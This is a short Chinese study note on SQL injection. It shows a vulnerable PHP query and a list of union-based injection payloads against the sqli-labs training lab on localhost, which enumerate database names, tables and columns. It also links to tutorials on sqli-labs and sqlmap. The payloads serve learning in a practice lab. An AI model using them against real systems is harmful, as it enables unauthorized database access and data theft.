---
title: "2_6SQL注入"
date: 2020-03-11
tag: "sql注入 sqli-labs" 
---

> SQL注入

##### SQL注入原理

    $sql="SELECT *  FROM users WHERE id='$id' LIMIT 0,1";
    // ?id= 后面输入 ' or 1=1 --+(mysql注释)
    SELECT * FROM users WHERE id='' or 1=1 -- LIMIT 0,1

##### sqli-labs

    http://localhost/sqli-labs-master/Less-1/?id=1 or 1=1。

    http://localhost/sqli-labs-master/Less-1/?id=1' order by 3 --+

    http://localhost/sqli-labs-master/Less-1/?id=' union select 1,database(),user() --+。

    http://localhost/sqli-labs-master/Less-1/?id=' union select 1,2,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)--+

    http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='test') --+

    http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='test') --+


[sqli-lab详解——做题笔记1-10](https://blog.csdn.net/Dream__Catcher/article/details/82964394)

[11种常见SQLMAP使用方法详解](https://www.cnblogs.com/ichunqiu/p/5805108.html)

##### SQLmap